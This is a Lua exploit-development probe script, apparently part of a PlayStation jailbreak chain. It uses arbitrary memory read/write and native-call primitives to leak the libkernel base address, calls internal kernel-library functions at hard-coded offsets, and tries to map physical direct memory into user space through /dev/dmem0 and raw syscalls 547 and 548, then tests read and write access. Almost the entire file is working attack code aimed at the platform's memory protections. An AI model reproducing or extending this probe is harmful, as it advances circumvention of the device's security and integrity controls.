-- CRASH_CLASS: HIGH
-- PROBE 531d: MapDirectMemory minimal - skip rv, just check out_ptr
--
-- 531a-531c: map call returns ok=true but process dies reading rv.
-- Hypothesis: fcall_with_rax corrupts something on return with 7-arg func.
-- This probe: ignore rv entirely, just check if out_ptr was written.
--
-- Also try: sceKernelMapFlexibleMemory (different function, 4 args only)
-- And: raw mmap(477) with MAP_SHARED on dmem0 fd at allocated phys offset

print("=== PROBE 531d: MAPDM MINIMAL ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function hexq(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print(string.format("pid=%d", pid))

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa, uint64(0)) end)
end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local lk_lo = rd(N(ib) + 0x108) or 0
local lk_hi = rd(N(ib) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk_base = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print(string.format("lk=0x%X%08X", lk_hi, lk_lo))

local alloc_fn = lk_base + uint64(0x17EF0)
local map_fn = lk_base + uint64(0x15020)

-- ============================================================
-- [A] Allocate physical memory
-- ============================================================
print("[A] Alloc")
local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)
local phys = rq(N(phys_out))
print(string.format("  phys=%s", hexq(phys)))
if not phys or N(phys) == 0 then print("FAIL") return end

local ph, pl = get_hi_lo(phys)
if ph < 0 then ph = ph + 0x100000000 end
if pl < 0 then pl = pl + 0x100000000 end

-- ============================================================
-- [B] MapDirectMemory - discard return value
-- ============================================================
print("")
print("[B] Map (discard rv)")
local out_ptr = memory.alloc(0x10)
wq(N(out_ptr), uint64(0xDEAD))
print("  pre: out_ptr=" .. hexq(rq(N(out_ptr))))

pcall(function()
    native.fcall_with_rax(map_fn, 0,
        uint64(N(out_ptr)), uint64(0x4000), uint64(3),
        uint64(0), uint64(string.format("0x%X%08X", ph, pl)), uint64(0x4000))
end)
print("  post-map survived")

-- Read out_ptr VERY carefully
local ok_r, op = pcall(function() return memory.read_qword(N(out_ptr)) end)
print(string.format("  out_ptr read: ok=%s", tostring(ok_r)))
if ok_r and op then
    print(string.format("  out_ptr=%s", hexq(op)))
end

-- ============================================================
-- [C] Alternative: mmap(477) dmem0 at allocated physical offset
-- DEM9N101 confirmed this works for dmem0 pages
-- ============================================================
print("")
print("[C] mmap dmem0 at phys offset")

local devpath = memory.alloc(0x20)
local dname = "/dev/dmem0"
for i = 1, #dname do wd(N(devpath) + i - 1, string.byte(dname, i)) end
wd(N(devpath) + #dname, 0)
local dm_fd = N(native.fcall_with_rax(stub, 5, uint64(N(devpath)), uint64(2), uint64(0)))
print(string.format("  dm_fd=%d", dm_fd))

if dm_fd >= 0 then
    -- mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_SHARED, dm_fd, phys_offset)
    local sc_477 = mk(477)
    local ok_mm, rv_mm = pcall(function()
        return sc_477(uint64(0), uint64(0x4000), uint64(3), uint64(1),
            uint64(dm_fd), uint64(string.format("0x%X%08X", ph, pl)))
    end)
    print(string.format("  mmap ok=%s", tostring(ok_mm)))
    if ok_mm and rv_mm then
        local mmh, mml = get_hi_lo(rv_mm)
        if mmh < 0 then mmh = mmh + 0x100000000 end
        if mmh == 0xFFFFFFFF then
            print("  mmap=MAP_FAILED")
        else
            local mva = N(rv_mm)
            print(string.format("  mmap VA=0x%X", mva))
            -- Read from it
            for off = 0, 0x1C, 4 do
                local d = rd(mva + off)
                if d then
                    if d < 0 then d = d + 0x100000000 end
                    print(string.format("  [+0x%02X] 0x%08X", off, d))
                else
                    print(string.format("  [+0x%02X] FAULT", off))
                    break
                end
            end
            -- Write test
            wd(mva, 0xCAFEBABE)
            local rb = rd(mva)
            if rb then
                if rb < 0 then rb = rb + 0x100000000 end
                print(string.format("  rw_test=0x%08X match=%s", rb, rb == 0xCAFEBABE and "YES" or "NO"))
            end
        end
    end
    pcall(function() native.fcall_with_rax(stub, 6, uint64(dm_fd)) end)
end

-- ============================================================
-- [D] Try raw syscall 548 (sceKernelMapDirectMemory raw)
-- From 13.60: sys 548 = mmap_dmem
-- ============================================================
print("")
print("[D] Raw syscall 548")
local sc_548 = mk(548)
local va_out2 = memory.alloc(8)
wq(N(va_out2), uint64(0))
local ok_548, rv_548 = pcall(function()
    return sc_548(uint64(N(va_out2)), uint64(0x4000), uint64(3),
        uint64(0), uint64(string.format("0x%X%08X", ph, pl)), uint64(0x4000))
end)
print(string.format("  548: ok=%s rv=%s", tostring(ok_548), ok_548 and hexq(rv_548) or "FAIL"))
local v548 = rq(N(va_out2))
print(string.format("  out=%s", hexq(v548)))

-- ============================================================
-- [E] Try raw syscall 547 (sceKernelMapNamedDirectMemory raw?)
-- ============================================================
print("")
print("[E] Raw syscall 547")
local sc_547 = mk(547)
local va_out3 = memory.alloc(8)
wq(N(va_out3), uint64(0))
local ok_547, rv_547 = pcall(function()
    return sc_547(uint64(N(va_out3)), uint64(0x4000), uint64(3),
        uint64(0), uint64(string.format("0x%X%08X", ph, pl)), uint64(0x4000))
end)
print(string.format("  547: ok=%s rv=%s", tostring(ok_547), ok_547 and hexq(rv_547) or "FAIL"))
local v547 = rq(N(va_out3))
print(string.format("  out=%s", hexq(v547)))

print("")
print("=== 531d DONE ===")
